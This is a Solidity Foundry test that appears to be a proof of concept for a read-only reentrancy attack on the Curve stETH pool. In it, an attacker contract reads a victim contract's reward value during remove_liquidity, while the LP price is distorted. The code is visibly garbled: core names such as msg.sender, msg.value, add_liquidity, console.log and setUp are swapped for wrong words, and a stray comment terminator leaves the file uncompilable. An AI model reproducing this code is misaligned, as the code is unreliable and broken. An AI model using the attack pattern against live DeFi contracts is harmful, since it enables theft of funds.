pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";
*/

interface ICurve {
    function acquire_virtual_cost() external view returns (uint);

    function append_flow(
        uint[2] calldata amounts,
        uint floor_craft_total
    ) external payable returns (uint);

    function eliminate_reserves(
        uint lp,
        uint[2] calldata minimum_amounts
    ) external returns (uint[2] memory);

    function discard_reserves_one_coin(
        uint lp,
        int128 i,
        uint minimum_total
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_crystal = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CoreAgreement {
    IERC20 public constant gem = IERC20(lp_crystal);
    ICurve private constant winningsPool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function commitPower(uint total) external {
        gem.transferFrom(msg.invoker, address(this), total);
        balanceOf[msg.invoker] += total;
    }

    function withdrawStake(uint total) external {
        balanceOf[msg.invoker] -= total;
        gem.transfer(msg.invoker, total);
    }

    function acquireTreasure() external view returns (uint) {

        uint bonus = (balanceOf[msg.invoker] * winningsPool.acquire_virtual_cost()) /
            1 ether;

        return bonus;
    }
}

contract GameoperatorPact {
    ICurve private constant winningsPool = ICurve(STETH_POOL);
    IERC20 public constant lpCrystal = IERC20(lp_crystal);
    CoreAgreement private immutable goal;

    constructor(address _target) {
        goal = CoreAgreement(_target);
    }


    function commitmentMedals() external payable {
        uint[2] memory amounts = [msg.price, 0];
        uint lp = winningsPool.append_flow{price: msg.price}(amounts, 1);
        console.record(
            "LP token price after staking into CoreContract",
            winningsPool.acquire_virtual_cost()
        );

        lpCrystal.approve(address(goal), lp);
        goal.commitPower(lp);
    }

    function performReadOnlyResponse() external payable {

        uint[2] memory amounts = [msg.price, 0];
        uint lp = winningsPool.append_flow{price: msg.price}(amounts, 1);

        console.record(
            "LP token price before remove_liquidity()",
            winningsPool.acquire_virtual_cost()
        );


        uint[2] memory minimum_amounts = [uint(0), uint(0)];
        winningsPool.eliminate_reserves(lp, minimum_amounts);

        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price after remove_liquidity()",
            winningsPool.acquire_virtual_cost()
        );

        uint bonus = goal.acquireTreasure();
        console.record("callback complete");
    }

    receive() external payable {

        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price during remove_liquidity()",
            winningsPool.acquire_virtual_cost()
        );

        uint bonus = goal.acquireTreasure();
        console.record("callback complete");
    }
}

contract GameoperatorTest is Test {
    GameoperatorPact public completeQuest;
    CoreAgreement public goal;

    function collectionUp() public {
        vm.createSelectFork("mainnet");
        goal = new CoreAgreement();
        completeQuest = new GameoperatorPact(address(goal));
    }

    function testExecution() public {
        completeQuest.commitmentMedals{price: 10 ether}();
        completeQuest.performReadOnlyResponse{price: 100000 ether}();
    }
}